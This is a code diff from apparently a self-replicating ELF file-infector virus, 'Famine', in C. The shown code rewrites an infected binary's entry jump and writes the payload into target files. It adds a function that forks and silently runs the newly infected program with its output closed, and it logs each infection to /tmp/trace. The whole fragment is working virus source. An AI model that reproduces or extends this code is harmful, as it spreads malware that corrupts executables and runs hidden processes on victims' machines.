@@ -42,11 +42,32 @@ static void replicate_on_memory(const struct s_info *info, char *ptr)
 	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int32_t));
 }
 
+static void fuck_you(const struct s_info *info)
+{
+	pid_t child;
+	char *av[] = {info->name, NULL};
+
+	child = _fork();
+
+	if (child == 0)
+	{
+		_close(STDIN_FILENO);
+		_close(STDOUT_FILENO);
+		_close(STDERR_FILENO);
+
+		_execve(av[0], av, NULL);
+
+		Exit(42);
+	}
+	else
+		_wait4(child, NULL, WSTOPPED, NULL);
+}
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void inject(const struct s_info *info, const size_t m_entry)
+void inject(struct s_info *info)
 {
 	char *ptr;
 
@@ -58,16 +79,20 @@ void inject(const struct s_info *info, const size_t m_entry)
 
 	_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE);
 	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);
-
+	release_info(info);
 
 #if DEBUG
-	(void)m_entry;
+	char name[] = "/tmp/trace";
+	int fd = _open(name, O_RDWR | O_CREAT | O_APPEND, 0644);
+	char fam[] = "Famine: ";
+	char des[] = " has been infected\n";
 
-	char fam[] = "\033[0;32mFamine\033[0m: ";
-	char des[] = " has been infected\n\n";
+	_write(fd, fam, _strlen(fam)); 
+	_write(fd, info->name, _strlen(info->name));
+	_write(fd, des, _strlen(des)); 
 
-	_write(1, fam, _strlen(fam)); 
-	_write(1, info->name, _strlen(info->name));
-	_write(1, des, _strlen(des)); 
+	_close(fd);
 #endif
+
+	fuck_you(info);
 }
